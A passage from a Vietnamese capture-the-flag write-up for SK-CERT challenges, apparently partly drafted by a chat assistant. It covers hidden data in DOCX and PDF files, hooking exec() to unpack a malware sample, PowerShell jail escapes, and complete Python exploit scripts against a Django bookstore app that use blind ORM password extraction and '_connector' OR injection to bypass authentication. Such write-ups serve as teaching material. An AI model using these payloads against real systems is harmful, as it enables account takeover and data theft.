* **Chuỗi tìm được:** `HIDDEN_MSG_2_{47d0241a}`
* **MSG_2 = `47d0241a`**

#### Bước 3: Tìm Mảnh ghép 3 (MSG_3) - footer1.xml
Tiếp tục kiểm tra các thành phần cấu trúc khác của văn bản, ta phát hiện manh mối trong file `word/footer1.xml` (chứa dữ liệu phần chân trang). Tại đây, tác giả đã dùng thủ thuật bẻ nhỏ từng ký tự của thông điệp và giấu vào các thẻ `<w:t>` (text) riêng lẻ để lách qua công cụ tìm kiếm của Word.
* Ghép các thẻ `<w:t>` lại, ta thu được: `H I D D E N _ M S G _ 3 _ { 5 c a f 6 9 d 6 }`.
* **MSG_3 = `5caf69d6`**

#### Bước 4: Tìm Mảnh ghép 4 (MSG_4) - vbaProject.bin
Kiểm tra file `word/vbaData.xml`, ta thấy các dấu vết định nghĩa Macro như `AutoOpen` và `Document_Close`. Điều này khẳng định tài liệu Word có chứa mã thực thi VBA.
Truy cập vào tệp `word/vbaProject.bin` và tiến hành phân tích mã nguồn (có thể dùng công cụ như `olevba`), ta tìm thấy một đoạn macro chứa mảnh ghép thứ 4.
* **Chuỗi tìm được:** `HIDDEN_MSG_4_{1ff1519f}`
* **MSG_4 = `1ff1519f`**

#### Bước 5: Tìm Mảnh ghép 1 (MSG_1) - Media/image39.png
Mảnh ghép cuối cùng được giấu rất kỹ trong một tệp hình ảnh đính kèm. Bằng cách kiểm tra thư mục `word/media/`, ta lấy được file `image39.png`. Việc sử dụng các kỹ thuật phân tích ảnh (như dùng lệnh `strings`, kiểm tra metadata bằng `exiftool` hoặc steganography) đã giúp trích xuất thành công đoạn văn bản bị ẩn bên trong bức ảnh này.
* **Chuỗi tìm được:** `HIDDEN_MSG_1_{03c77a9b}`
* **MSG_1 = `03c77a9b`**

#### Bước 6: Ghép Password và lấy Flag
Dựa vào chỉ thị từ tệp `README2.txt`: `|The exact order is 4312|`, công thức ghép mật khẩu sẽ là:
`FLAG_PASSWORD = MSG_4 + MSG_3 + MSG_1 + MSG_2`

Tiến hành ráp các mảnh lại với nhau:
`FLAG_PASSWORD` = `1ff1519f` + `5caf69d6` + `03c77a9b` + `47d0241a`

Dùng mật khẩu **`1ff1519f5caf69d603c77a9b47d0241a`** để giải nén tệp `flag2.zip`, ta thu được cờ cuối cùng:

> Flag: `SK-CERT{M5W0RD_F0R3N51C5}`
{: .prompt-flag }

Chúc mừng bạn! Chuỗi flag `SK-CERT{WHY_15_MJ_3V3RYWH3R3}` (Tại sao Michael Jackson lại ở khắp mọi nơi thế này) thực sự rất hài hước và là một cái kết quá trọn vẹn cho series "Administrative tasks" này. 

Cách bạn dùng Photopea để thêm một layer đen nhằm làm nổi bật dòng chữ trắng ẩn trên nền trắng là một trick cực kỳ thông minh và thực tế trong mảng Forensics tài liệu!

Dưới đây là bản Write-up (WU) hoàn chỉnh cho bài Portable (PDF) này, tổng hợp toàn bộ các bước xử lý điêu luyện của bạn:

---

### **Administrative tasks - Portable**

- Mô tả: 

We probably got access to some new encryption standard before release! Can you inspect if it is real stuff or just another joke ? Please read README inside .zip file.

- Attachments: `PART_3.zip`
- Cách giải:

#### Bước 1: Tìm Mảnh ghép 1 (MSG_1) - Văn bản tàng hình (White-on-White)
Một trong những thủ thuật che giấu thông tin cơ bản nhất trong tệp PDF là đổi màu chữ trùng với màu nền (màu trắng). 
Thay vì dùng các công cụ bóc tách phức tạp, ta có thể nhập file PDF vào phần mềm chỉnh sửa ảnh hỗ trợ layer như **Photopea** (hoặc Photoshop). Bằng cách tạo thêm một layer (lớp) mới và tô đen toàn bộ, sau đó đặt nó xuống dưới cùng, dòng chữ tàng hình ngay lập tức hiện ra.
* **Chuỗi thu được:** `HIDDEN_MSG_1_{4abcc69f}`
* **MSG_1 = `4abcc69f`**

#### Bước 2: Tìm Mảnh ghép 4 (MSG_4) - Tệp đính kèm (Embedded ZIP)
Định dạng PDF cho phép đính kèm (embed) các tệp tin khác vào bên trong nó. Bằng cách sử dụng các công cụ phân tích cấu trúc PDF (như `binwalk`, `peepdf` hoặc các trình đọc PDF có hỗ trợ xem Attachment), ta phát hiện và trích xuất thành công một tệp/thư mục ZIP bị nhúng ngầm.
Sau khi giải nén tệp ZIP này, ta thu được mảnh ghép thứ 4.
* **Chuỗi thu được:** `HIDDEN_MSG_4_{85add2c0}`
* **MSG_4 = `85add2c0`**

#### Bước 3: Tìm Mảnh ghép 3 (MSG_3) - Chuỗi Hex trong `<Contents>`
Tiến hành quét các chuỗi văn bản dạng plaintext bên trong file PDF bằng lệnh `strings PBES-512.pdf`. Qua rà soát, ta phát hiện một đoạn mã Hex đáng ngờ nằm trong thẻ `<Contents>`.
Sử dụng công cụ **CyberChef** để giải mã đoạn mã Hex này (thao tác *From Hex*), văn bản ẩn lộ diện.
* **Chuỗi thu được:** `HIDDEN_MSG_3_{0a6899cf}`
* **MSG_3 = `0a6899cf`**

#### Bước 4: Tìm Mảnh ghép 2 (MSG_2) - Phân tích Object Stream (pdf-parser)
Sử dụng công cụ chuyên dụng `pdf-parser.py` để tìm kiếm từ khóa `HIDDEN_MSG` trong toàn bộ các Object của PDF.
Lệnh: `python pdf-parser.py -o 258 PBES-512.pdf`
Phát hiện Object số 258 chứa một luồng dữ liệu (stream) bị nén bằng thuật toán `FlateDecode`. Tiến hành ép công cụ giải nén và xuất dữ liệu thô (raw data) bằng cờ `-f`:
Lệnh: `python pdf-parser.py -o 258 -f -d obj258_stream.txt PBES-512.pdf`

Kiểm tra nội dung tệp `obj258_stream.txt`, ta thấy các lệnh vẽ PostScript của PDF chia nhỏ từng ký tự vào trong các dấu ngoặc đơn:
`( H) ( I) ( D  ) ... ( 1  ) ( 0  ) ( 0  ) ( b  ) ( f  ) ( 9  ) ( 1  ) ( } )`
Ghép tất cả các ký tự lại, ta được thông điệp hoàn chỉnh.
* **Chuỗi thu được:** `HIDDEN_MSG_2_{b100bf91}`
* **MSG_2 = `b100bf91`**

#### Bước 5: Ghép Password và lấy Flag
Dựa vào chỉ thị từ tệp `README3.txt`: `|The exact order is 4321|`, công thức ghép mật khẩu sẽ là:
`FLAG_PASSWORD = MSG_4 + MSG_3 + MSG_2 + MSG_1`

Tiến hành ráp 4 mảnh lại với nhau:
`FLAG_PASSWORD` = `85add2c0` + `0a6899cf` + `b100bf91` + `4abcc69f`

Sử dụng mật khẩu **`85add2c00a6899cfb100bf914abcc69f`** để giải nén tệp `flag3.zip`, ta nhận được cờ cuối cùng:

> Flag: `SK-CERT{WHY_15_MJ_3V3RYWH3R3}`
{: .prompt-flag }


## **Malware Analysis**

### **Malware Sanity Check - plaintext malware**

- Mô tả: 

Analyze code of the malware sample and submit the flag. Flag format is SK-CERT{...}

- Attachment: `mw.py`
- Cách giải: Mở file mw.py và lấy flag

> Flag: `SK-CERT{s70l3n_s3cr37s_g03s_70_4774ck3r}`
{: .prompt-flag }

### **Reversing - Picking letters**

- Mô tả: 

Can you find correct letters of the flag?

- Attachment: file binary `lorem`
- Cách giải: Tôi sử dụng web [Decompiler Explorer](https://dogbolt.org/) và lấy Flag

![](assets/img/Cybergame2026/reversing-pickingletters.png)

> Flag: `SK-CERT{34sy_70_d3bug_wh3n_y0u_h4v3_wh0l3_c0d3}`
{: .prompt-flag }

### **Reversing - Matrix sudoku**

- Mô tả: 

Can you solve this simple matrix? If your input satisfies the constraints, you will get decrypted flag.

- Attachment: `get_flag.py`
- Cách giải: Chạy file lên và nhập từ 1 tới 25 rồi nhận Flag

```text
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
```

> Flag: `SK-CERT{simpl3_m47rix_sud0ku}`
{: .prompt-flag }

### **To True or Not To True**

- Mô tả:  

You are given a program recovered from an unknown source. Its purpose is not immediately clear and documentation is unavailable. Analyze the program to understand its behavior.

- Attachment: `trueorfalse.py`
- Cách giải:

Dựa vào hành vi của bài, mã độc (malware) có khả năng đã bị obfuscate và sử dụng các hàm built-in của Python như `exec()` hoặc `compile()` để giải nén và thực thi payload trong bộ nhớ.

Thay vì phải deobfuscate thủ công từng lớp tốn thời gian, cách tiếp cận thông minh ở đây là phân tích động (dynamic analysis) kết hợp kỹ thuật **hooking** (chặn bắt hàm). Bằng cách sử dụng script Python, chúng ta ghi đè các hàm `builtins.exec` và `builtins.compile` bằng các hàm giả mạo của riêng mình.

Khi script malware tự động giải mã và gọi lệnh thực thi, hàm giả mạo sẽ "bắt" được luồng này, trích xuất và in ra các chuỗi hằng số (`co_consts`) từ Code Object của payload, đồng thời ngăn chặn malware thực sự chạy trên hệ thống.

Sử dụng script hook `solve.py` dưới đây để phân tích file `trueorfalse.py`:

```python
import builtins

# Lưu lại các hàm gốc của hệ thống
real_exec = builtins.exec
real_compile = builtins.compile

# Tạo hàm giả mạo để chặn bắt lệnh compile
def hooked_compile(*args, **kwargs):
    print("\n[+] BẮT ĐƯỢC LỆNH COMPILE!")
    print("=== MÃ NGUỒN SAU KHI GIẢI MÃ ===")
    print(args[0])  # In ra plaintext
    print("================================")
    return real_compile(*args, **kwargs)

# Tạo hàm giả mạo để chặn bắt lệnh exec
def hooked_exec(*args, **kwargs):
    print("\n[+] BẮT ĐƯỢC LỆNH EXEC!")
    code_obj = args[0]
    
    if isinstance(code_obj, str):
        print(code_obj)
    elif hasattr(code_obj, 'co_consts'):
        print("-> Đang trích xuất chuỗi từ Code Object:")
        for const in code_obj.co_consts:
            if isinstance(const, str) and len(const) > 2:
                print(f"   {const}")
                
    print("\n[*] Đã lấy được dữ liệu. Ngăn chặn thực thi thành công!")

file_path = "./trueorfalse.py"

# Đọc file mã độc
with open(file_path, "r", encoding="utf-8") as f:
    malware_code = f.read()

print("[*] Đang nạp và giải mã malware...")

try:
    # Bắt đầu ghi đè hàm
    builtins.compile = hooked_compile
    builtins.exec = hooked_exec
    
    # Chạy mã độc
    real_exec(malware_code)
except Exception as e:
    pass
finally:
    # BẮT BUỘC TRẢ LẠI HÀM GỐC CHO HỆ THỐNG
    builtins.compile = real_compile
    builtins.exec = real_exec
    print("\n[*] Đã khôi phục môi trường trở lại bình thường.")
```

Khi chạy script trên, quá trình unpack của malware bị chặn đứng ngay tại thời điểm gọi `exec()`. Các chuỗi ẩn chứa hành vi độc hại (và cả Flag) được in ra rõ ràng trước khi ransomware kịp khởi chạy:

```bash
[*] Đang nạp và giải mã malware...

[+] BẮT ĐƯỢC LỆNH EXEC!
-> Đang trích xuất chuỗi từ Code Object:
   --- malware succesfully executed ---
   enumerating victim system:
   pwd; whoami; 
   SK-CERT{w0w0w0w0_u_f0und_m33333_u_Pr0_M4lw_4n4ly57_6j}
   -------
persistence added
ransomware will be silently executed in 5 minutes

[*] Đã lấy được dữ liệu. Ngăn chặn thực thi thành công!

[*] Đã khôi phục môi trường Colab trở lại bình thường.
```

> Flag: `SK-CERT{w0w0w0w0_u_f0und_m33333_u_Pr0_M4lw_4n4ly57_6j}`
{: .prompt-flag }

## **Offensive Security**

### **JailPS - safeps**

- Mô tả:

Get flag. Or git gud.

nc exp.cybergame.sk 7004

- Attachment: `safeps.zip`
- Cách giải:

#### 1. Phân tích môi trường và rào cản

Dựa vào mã nguồn `script.ps1` và `docker-compose.yaml` được cung cấp trong bài, ta thấy môi trường này được cấu hình rất khắt khe:

* **Hệ điều hành:** Ứng dụng chạy trên Linux container (`mcr.microsoft.com/powershell:latest`). Điều này rất quan trọng vì nó mở ra hướng tấn công sử dụng các lệnh native của Linux.
* **Danh sách đen (Blacklist):** Một mảng `$Bad` khổng lồ chặn gần như mọi cmdlet của PowerShell (`get-content`, `invoke-expression`, `ls`, `cd`...) và cả các cụm từ ngắn như `rv`, `sc`, `ps`, `rm`, chữ `r`.
* **Bộ lọc Regex:** Lệnh `echo` có các regex chặn đứng mọi ký tự đặc biệt thiết yếu dùng để lập trình trong PowerShell như `$`, `-`, `.`, `_`, ngoặc vuông `[]`, ngoặc nhọn `{}`.
* **Giới hạn độ dài:** Payload không được vượt quá 60 ký tự.

#### 2. Lỗ hổng (Vulnerability)

Điểm yếu chí mạng nằm ở cách xử lý lệnh `echo` nếu bạn truyền vào một biểu thức phức tạp:

```powershell
$sb = [ScriptBlock]::Create($exprTrimmed)
$result = & $sb
```

Nếu chuỗi đầu vào lách qua được bộ lọc regex và không dính từ khóa cấm, nó sẽ được chuyển thành một `ScriptBlock` và thực thi trực tiếp.

Hơn nữa, ký tự đường ống dẫn (pipeline `|`) không hề bị chặn! Do đang chạy trên Linux, PowerShell cho phép ta dùng pipeline để đẩy output sang các binary có sẵn của hệ điều hành (như `sh`, `bash`).

#### 3. Xây dựng Payload (The Bypass)

Mục tiêu là đọc file `/srv/script.ps1` (nơi chứa flag hardcode). Nhưng làm sao để gọi tên file khi hầu hết các chữ cái đều dính blacklist?

* **Lệnh đọc file:** Không thể dùng `cat` (bị cấm). Thay vào đó, ta dùng `head`.
* **Đường dẫn `/srv/`:** Chứa chuỗi `rv` (bị cấm). Ta lách luật bằng wildcard của Linux: `/*`.
* **Tên file `script.ps1`:** Chứa `sc`, `r`, `ps` (bị cấm). Ta tiếp tục dùng wildcard để khớp ký tự đầu và cuối: `s*1`.

=> Chuỗi `/*/s*1` sẽ được Linux shell (`sh`) tự động nội suy (globbing) thành `/srv/script.ps1`.

Ghép tất cả lại, ta có cụm lệnh không vi phạm bất kỳ luật nào của PowerShell Jail: `"head /*/s*1"`.

Ta đưa chuỗi này vào lệnh `echo` và pipe thẳng qua shell của Linux:
`echo "head /*/s*1" | sh`

#### 4. Thực thi và Lấy Flag

Kết nối vào server và tung payload:

```bash
└─PS> nc exp.cybergame.sk 7004
Welcome to SAFEPS, hardened environment.
echo "head /*/s*1" | sh
```

Lệnh `head` được thực thi bởi `sh` sẽ in ra 10 dòng đầu tiên của file script, trực tiếp làm lộ diện biến chứa flag:

```powershell
$ErrorActionPreference = "SilentlyContinue"
Set-StrictMode -Off

$FLAG = "SK-CERT{1_l0v3_p0w45h3LLz_h0P3_u2}"
```

> Flag: `SK-CERT{1_l0v3_p0w45h3LLz_h0P3_u2}`
{: .prompt-flag }

### **JailPS - safeps2**

- Mô tả:

Get flag. Or git gud. Previous chall was too ez, right?

nc exp.cybergame.sk 7005

- Attachment: `safepsv2.zip`
- Cách giải: 

#### 1. Phân tích rào cản mới (Sự khác biệt của V2)

Trong phiên bản `safeps2`, tác giả đã vá lỗ hổng từ bài trước bằng cách thêm một bộ lọc Regex cực kỳ khắt khe vào lệnh `echo`:

```powershell
if ($exprTrimmed -match '\s') {
  Write-Host "Nope." -ForegroundColor Red
  return
}
```

* **Chặn khoảng trắng:** Ký tự `\s` đại diện cho mọi loại khoảng trắng (space, tab, newline). Payload cũ (`"head /*/s*1"`) lập tức bị vô hiệu hóa vì chứa dấu cách giữa `head` và đường dẫn file.
* **Giữ nguyên các giới hạn cũ:** Danh sách đen `$Bad` (chặn `r`, `ps`, `cat`...) và bộ lọc Regex (chặn `$`, `_`, `.`, `-`...) vẫn hoạt động, triệt tiêu luôn khả năng dùng biến môi trường của Linux (như `${IFS}`) để giả mạo khoảng trắng.

#### 2. Kỹ thuật Bypass (Không dùng khoảng trắng)

Dù đã chặn khoảng trắng, server vẫn mắc lỗi thiết kế cốt lõi: cho phép đưa chuỗi vào `ScriptBlock` và không chặn ký tự Pipeline (`|`). Mục tiêu bây giờ là viết một lệnh Linux hợp lệ để đọc file `/srv/script.ps1` mà **không dùng bất kỳ dấu cách nào**.

* **Sử dụng Input Redirection (`<`):** Trong Linux shell, dấu `<` dùng để đẩy nội dung file vào standard input của một lệnh mà không yêu cầu dấu cách xung quanh (VD: `Lệnh<TênFile`).
* **Vấn đề của `sh` (Dash):** Ở bài trước ta dùng `sh`, nhưng khi kết hợp `<` với wildcard (`/*/s*1`), `sh` sẽ báo lỗi `cannot open /*/s*1: No such file`. Lý do là `sh` chuẩn POSIX không hỗ trợ tự động mở rộng wildcard (globbing) phía sau toán tử `<`.
* **Giải pháp với `bash`:** Khác với `sh`, `bash` có khả năng nội suy wildcard sau toán tử `<` miễn là biểu thức đó chỉ khớp với **duy nhất một file**.
* **Tối ưu hóa đường dẫn:** Để tránh bash nhận diện nhầm nhiều file (ambiguous redirect), ta thu hẹp wildcard thành `/s*v/s*1` (khớp chính xác với `/srv/script.ps1` mà không dính chữ `r` hay cụm `ps` bị cấm).

#### 3. Payload & Thực thi

Ghép các yếu tố lại, ta có payload hoàn hảo: `echo "head</s*v/s*1"|bash`

Kết nối vào server và tiến hành khai thác:

```bash
└─PS> nc exp.cybergame.sk 7005
Welcome to SAFEPSv2, hardened environment.
echo "head</s*v/s*1"|bash
```

Shell `bash` nhận chuỗi từ PowerShell, tự động mở rộng `/s*v/s*1` thành `/srv/script.ps1`, và đẩy nội dung vào lệnh `head`. Kết quả trả về chứa dòng khai báo flag:

```powershell
$ErrorActionPreference = "SilentlyContinue"
Set-StrictMode -Off

$FLAG = "SK-CERT{pow3R5H3LL_d03n7_C4r3_b0u7_5p4c3zzz}" 
```

> Flag: `SK-CERT{pow3R5H3LL_d03n7_C4r3_b0u7_5p4c3zzz}` 
{: .prompt-flag }

### **ORMT - ormt**

- Mô tả:

A local bookstore has deployed a new online library system. The application lets users browse books, view details, and search the catalogue using a custom lookup feature. We have been retained to perform a security assessment of the application. Your objective is to gain access to the admin area and retrieve the flag.

http://exp.cybergame.sk:7001

- Attachment: `handout.zip`
- Cách giải: 


#### 1. Phân tích mục tiêu
Hệ thống là một trang thư viện sách trực tuyến được viết bằng **Django**. Mục tiêu của chúng ta là truy cập vào endpoint `/admin`, khu vực này được bảo vệ bởi cơ chế HTTP Basic Auth yêu cầu tài khoản có role là `admin`. 

Dựa vào file `0002_seed_data.py`, có một user admin được tạo tự động với username là `Admin` và mật khẩu ngẫu nhiên dài 32 ký tự (gồm chữ cái và chữ số). Vì thế, nhiệm vụ thực sự là: **Tìm cách trích xuất (leak) mật khẩu của user Admin từ database.**

#### 2. Truy tìm lỗ hổng (Vulnerability Analysis)
##### Tính năng Search
Tính năng tìm kiếm sách (`/book_lookup`) trong `views.py` nhận các tham số POST từ người dùng và đưa thẳng vào câu lệnh truy vấn ORM của Django:

```python
@csrf_exempt
def book_lookup(request):
    # ...
    if request.method == 'POST':
        filters = {}
        for filter in request.POST:
            if request.POST[filter] == '':
                continue
            try:
                filters[clean(filter)] = request.POST[filter]
            except: 
                filters[filter] = request.POST[filter]
        try:
            finds = Book.objects.filter(**filters)
        # ...
```

Việc đưa trực tiếp input vào kwargs của `Book.objects.filter(**filters)` là cực kỳ nguy hiểm trong Django. Hacker có thể sử dụng dấu gạch dưới kép `__` (double underscores) để thực hiện **ORM Relational Traversing** – nhảy từ bảng này sang bảng khác thông qua các khóa ngoại (Foreign Key) và đọc dữ liệu nhạy cảm.

##### Nỗ lực ngăn chặn yếu kém
Nhận thức được điều này, tác giả đã viết một hàm `clean()` nhằm thay thế `__` thành `_` thông qua đệ quy:

```python
def clean(filter, depth=0):
    if depth == 25:
        raise RecursionError
    if filter.find('__') != -1:
        return clean(filter.replace('__', '_', 1), depth+1)
    return filter.replace('_', '__', 1)
```

**Lỗ hổng nằm ở đâu?**
Hàm `clean` có một giới hạn đệ quy là `depth = 25`. Nếu chuỗi có từ 25 cụm `__` trở lên, hàm sẽ ném ra lỗi `RecursionError`.
Quay lại khối `try...except` ở trên, nếu việc `clean()` gặp exception, chương trình sẽ lấy **nguyên si giá trị ban đầu** (`filters[filter] = request.POST[filter]`) thay vì báo lỗi. 
=> **Cách bypass:** Chỉ cần tạo một khóa (key) hợp lệ trong Django ORM chứa nhiều hơn 25 cụm `__`, ta sẽ lách luật thành công và bypass hoàn toàn bộ lọc!

#### 3. Khai thác (Exploitation)
##### Xây dựng chuỗi quan hệ vô tận (Deep Relational Join)
Để payload hợp lệ và không bị Django báo lỗi `FieldError`, ta không thể đơn thuần nối `a_____b`. Mỗi cụm `__` phải là một quan hệ hợp lệ. Từ model `Book`, ta có thể tạo một vòng lặp truy vấn vô tận như sau:

*   Từ **Book** đến **Review**: `reviews`
*   Từ **Review** đến **SiteUser**: `by_user`
*   Từ **SiteUser** quay lại **Review** (reverse relation mặc định): `review`

Chuỗi quan hệ sẽ trông như thế này: `Book -> reviews -> by_user -> review -> by_user -> review ...`
Mỗi lần qua lại như vậy, ta tích lũy được lượng lớn `__`. Ở cuối chuỗi, ta nối với `password__startswith` để bắt đầu trích xuất mật khẩu của SiteUser. 

Payload mẫu:
`reviews__by_user` + (`__review__by_user` * 12) + `__password__startswith`
=> Payload này hoàn toàn hợp lệ về mặt Database Relations và chứa tận **27 cụm `__`**, vừa đủ làm sập hàm `clean()`!

##### Brute-force mật khẩu (Boolean-based Blind)
Vì có nhiều user trong database, ta cần giới hạn việc lấy mật khẩu vào đúng user `Admin`. Nhìn vào file `0002_seed_data.py`, user `Admin` đã review một cuốn sách cụ thể là *"The Rust Programming Language"*. Do đó, ta sẽ thêm điều kiện `title="The Rust Programming Language"` vào body POST để cô lập kết quả.

Hơn nữa, trong `apps.py`, tác giả đã thêm dòng cấu hình:
`cursor.execute("PRAGMA case_sensitive_like = ON;")`
Điều này làm cho câu lệnh `startswith` (tương đương `LIKE` trong SQLite) phân biệt chữ hoa, chữ thường. Ta có thể brute-force chính xác 32 ký tự mật khẩu.

#### 4. Script Exploit
Dưới đây là script Python thực hiện tự động toàn bộ quá trình:

```python
import requests
import string
import base64

url_lookup = "http://exp.cybergame.sk:7001/book_lookup"
url_admin = "http://exp.cybergame.sk:7001/admin"

# Mật khẩu dài 32 ký tự bao gồm chữ cái và số (từ string.ascii_letters + string.digits)
alphabet = string.ascii_letters + string.digits
password = ""

# Xây dựng payload vượt qua depth=25 của hàm clean()
# Vòng lặp quan hệ: reviews -> by_user -> review -> by_user -> ...
payload_key = "reviews__by_user" + "__review__by_user" * 12 + "__password__startswith"

s = requests.Session()
print("[*] Đang trích xuất mật khẩu của Admin. Vui lòng đợi...")

# Brute-force 32 ký tự
for i in range(32):
    for c in alphabet:
        test_pass = password + c
        data = {
            "title": "The Rust Programming Language", # Sách mà Admin đã review
            payload_key: test_pass
        }
        
        r = s.post(url_lookup, data=data)
        
        # Nếu True -> Tên sách sẽ xuất hiện lại trong kết quả trả về
        if "The Rust Programming Language" in r.text:
            password += c
            print(f"[*] Tiến độ lấy password: {password}")
            break

print(f"\n[+] Đã lấy thành công mật khẩu Admin: {password}")
print("[*] Đang đăng nhập vào endpoint /admin bằng HTTP Basic Auth...")

# Tạo Header HTTP Basic Auth
auth_str = f"Admin:{password}"
auth_b64 = base64.b64encode(auth_str.encode()).decode()

headers = {
    "Authorization": f"Basic {auth_b64}"
}

response = s.get(url_admin, headers=headers)

print("\n[+] BINGO! Flag của bạn đây:")
print(response.text)
```

```bash
[+] Final admin password successfully leaked: tuQ7V5eNpS1vOwoEb7GZLSB6xYwZRRei
[*] Retrieving the flag from the /admin endpoint...

[+] Success! Flag:
Congrats, SK-CERT{0rm_r3l4t10n_tr4v3rs4l_g0t_y0u}
```

> Flag: `SK-CERT{0rm_r3l4t10n_tr4v3rs4l_g0t_y0u}`
{: .prompt-flag }

### **ORMT - ormt2**

- Mô tả: 

Following our previous engagement, the development team claims to have patched all identified vulnerabilities and has overhauled their authentication system from scratch. They are requesting a re-test to confirm the fixes are effective and to identify any new security issues. Your objective is to bypass authentication and log in as the admin to retrieve the flag.

http://exp.cybergame.sk:7002

- Attachments: `handout.zip`
- Cách giải:

#### 1. Phân tích mã nguồn (Source Code Analysis)
Hãy nhìn vào đoạn code xử lý quá trình đăng nhập trong `views.py`:

```python
def sanitize(param):
    while param.find('__') != -1:
        param = param.replace('__', '_')
    return param

@csrf_exempt
def siteuser_login(request):
    # ...
    if request.method == 'POST':
        params = {}
        for param in request.POST:
            params[sanitize(param)] = request.POST[param]
            
        if {'password', 'username'}.intersection(params.keys()) != {'password', 'username'}:
            return HttpResponseServerError('Password and username required')
            
        try:
            user = SiteUser.objects.get(**params)
        # ...
        if user.role == 'admin':
            return render(request, 'error.html', {'message': 'SK-CERT{fake_flag}'})
```

**Những sai lầm chết người của Dev:**
1. **Filter nửa vời:** Hàm `sanitize` thay thế `__` thành `_`. Điều này chặn được các lookup tiêu chuẩn của Django như `__startswith`, `__contains`, ngăn chặn việc vét cạn (brute-force) mật khẩu. Tuy nhiên, nó **không chặn** được các field nội bộ bắt đầu bằng một dấu gạch dưới `_`.
2. **Kiểm tra lỏng lẻo:** Hàm `intersection` đảm bảo rằng trong request POST *phải có* `username` và `password`. Nhưng nó **không cấm** chúng ta gửi thêm các tham số khác.
3. **Unpacking User Input trực tiếp:** Câu lệnh `SiteUser.objects.get(**params)` ném toàn bộ dictionary mà người dùng kiểm soát vào backend của Django ORM. 

#### 2. Lỗ hổng CVE-2025-64459 (ORM Connector Injection)
Bình thường, khi bạn truyền nhiều tham số vào hàm `get()` hoặc `filter()` của Django, ORM sẽ tự động kết nối chúng bằng toán tử **AND**.
Ví dụ: `SiteUser.objects.get(username="a", password="b")`
SQL sinh ra: `SELECT * FROM SiteUser WHERE username='a' AND password='b'`

Tuy nhiên, trong một số phiên bản (hoặc thông qua một kỹ thuật được phát hiện trong CVE-2025-64459), cơ chế xây dựng Query Tree (Q objects) của Django cho phép ghi đè thuộc tính kết nối thông qua một key nội bộ bị lộ là **`_connector`**.

Nếu chúng ta truyền `_connector='OR'`, câu lệnh SQL sẽ bị thay đổi hoàn toàn:
SQL sinh ra: `SELECT * FROM SiteUser WHERE username='a' OR password='b'`

#### 3. Xây dựng chiến lược khai thác (Exploit Strategy)
Hàm `get()` của Django có một đặc điểm cực kỳ khắt khe: Nó **chỉ được phép trả về duy nhất 1 bản ghi (record)**. Nếu câu lệnh query tìm thấy 0 bản ghi (`DoesNotExist`) hoặc nhiều hơn 1 bản ghi (`MultipleObjectsReturned`), nó sẽ báo lỗi và throw Exception.

Dựa vào file `0002_seed_data.py`, ta biết trong hệ thống chỉ có đúng **1 user có role là `admin`**. 

Vậy nên chiến lược là ép ORM sử dụng toán tử **OR**, đồng thời truyền các thông tin giả để triệt tiêu các bản ghi khác:
- `username`: "chac_chan_khong_ton_tai" -> Trả về 0 kết quả.
- `password`: "chac_chan_khong_ton_tai" -> Trả về 0 kết quả.
- `role`: "admin" -> Trả về chính xác **1 kết quả** (tài khoản Admin).
- `_connector`: "OR" -> Biến truy vấn thành `username OR password OR role`.

Kết quả cuối cùng: Hàm `.get()` nhận được duy nhất 1 bản ghi là tài khoản Admin, lách qua hoàn toàn bước check mật khẩu!

#### 4. Mã Khai thác (Exploit Code)
Script Python tự động hóa quá trình tấn công:

```python
import requests

url_login = "http://exp.cybergame.sk:7002/login"

# Payload khai thác CVE-2025-64459 (ORM Connector Injection)
payload = {
    # Cung cấp username và password để thỏa mãn hàm .intersection()
    # Giá trị là rác để không khớp với bất kỳ user thường nào
    "username": "does_not_exist",
    "password": "does_not_exist",
    
    # Ép điều kiện khớp với đúng 1 bản ghi duy nhất của hệ thống
    "role": "admin",
    
    # Inject toán tử OR (Không bị chặn bởi hàm sanitize vì chỉ có 1 dấu _)
    "_connector": "OR"
}

print("[*] Đang gửi payload exploit CVE-2025-64459...")

s = requests.Session()
r = s.post(url_login, data=payload)

if "SK-CERT{" in r.text:
    print("\n[+] BINGO! Khai thác thành công. Lấy được quyền Admin!")
    
    # Cắt chuỗi để lấy ra chính xác flag từ HTML
    flag = r.text.split("SK-CERT{")[1].split("}")[0]
    print(f"Flag: SK-CERT{{{flag}}}")
else:
    print("[-] Khai thác thất bại. Server trả về:")
    print(r.text)
```

**Kết quả thực thi:**
```text
[*] Đang gửi payload exploit CVE-2025-64459...

[+] BINGO! Khai thác thành công. Lấy được quyền Admin!
Flag: SK-CERT{cve_2025_64459_c0nn3ct0r_1nj3ct10n}
```

> Flag: `SK-CERT{cve_2025_64459_c0nn3ct0r_1nj3ct10n}`
{: .prompt-flag }

### **ORMT - ormt3**

- Mô tả: 

The development team has revised the application once more, addressing all vulnerabilities reported during the previous two engagements. They have also introduced a new book repository feature with advanced filtering and aggregation capabilities. An admin area still exists and displays the flag upon successful authentication.

We have been asked to perform another security assessment of the updated application.

Your objective is to gain unauthorized access to the admin area and retrieve the flag.

http://exp.cybergame.sk:7003

- Attachments: `handout.zip`
- Cách giải:

#### 1. Phân tích lỗ hổng (Vulnerability Analysis)
Hãy cùng xem cách hệ thống xử lý tính năng Aggregate trong `views.py`:

```python
# Lấy tham số aggregate và field từ URL
aggregate_function = params.pop('aggregate')
target_field = params.pop('field')

# Ánh xạ tới hàm Aggregate tương ứng (VD: 'Convert')
aggregate_function_callable = AGGREGATES[aggregate_function]

# Đưa các tham số còn lại trong URL (**params) vào hàm Callable
result = Book.objects.filter(**filters).aggregate(
    res=aggregate_function_callable(target_field, **params)
)
```

Nút thắt nằm ở class `Convert` được tự định nghĩa trong `functions.py`:

```python
from django.db.models import Aggregate

class Convert(Aggregate):
    function = "SUM"
    template = "%(function)s(%(expressions)s) * %(rate)s" # LỖ HỔNG NẰM Ở ĐÂY
    allow_distinct = False
    arity = 1
    default_rate = '0.86'

    def __init__(self, expression, rate=None, **extra):
        extra.setdefault("rate", self.default_rate if rate is None else rate)
        super().__init__(expression, **extra)
```

**Nguyên lý tạo SQL của Django Aggregate:**
Khi biên dịch ra câu lệnh SQL, Django sử dụng cơ chế nội suy chuỗi (String Interpolation) của Python thông qua toán tử `%` đối với biến `template`. 
- `%(expressions)s` (ví dụ trường `id`, `price`...) được Django xử lý an toàn thông qua parameterized queries.
- Nhưng `%(rate)s` lại là một Kwargs (`**extra`) lấy trực tiếp từ `**params` của HTTP Request. Nó bị **nối thẳng (inject) vào chuỗi SQL dưới dạng plain-text** mà không trải qua bất kỳ bộ lọc hay escape nào!

